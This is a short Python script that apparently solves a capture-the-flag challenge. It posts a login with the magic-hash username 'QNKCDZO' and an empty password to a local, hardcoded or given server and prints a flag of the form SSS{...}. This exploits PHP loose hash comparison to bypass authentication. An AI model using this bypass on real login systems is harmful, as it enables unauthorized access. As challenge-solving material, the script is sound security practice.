import sys, requests, re

def get_url(args):
    if len(args) == 2 and args[1] == "local":
        return f"http://127.0.0.1:8005"
    elif len(args) == 2 and args[1] == "remote":
        return f"http://141.85.224.105:8005"
    elif len(args) == 3:
        return f"http://{args[1]}:{args[2]}"
    else:
        print(f"{args[0]} local")
        print(f"{args[0]} remote")
        print(f"{args[0]} <ip> <port>")
        sys.exit(1)

def main():
    url = get_url(sys.argv)
    data = {
        "username": "QNKCDZO",
        "password": "",
        "submit": "Login"
    }
    try:
        response = requests.post(url, data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        flag_match = re.search(r"SSS\{.*?\}", response.text)
        if flag_match:
            print(flag_match.group())
    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()
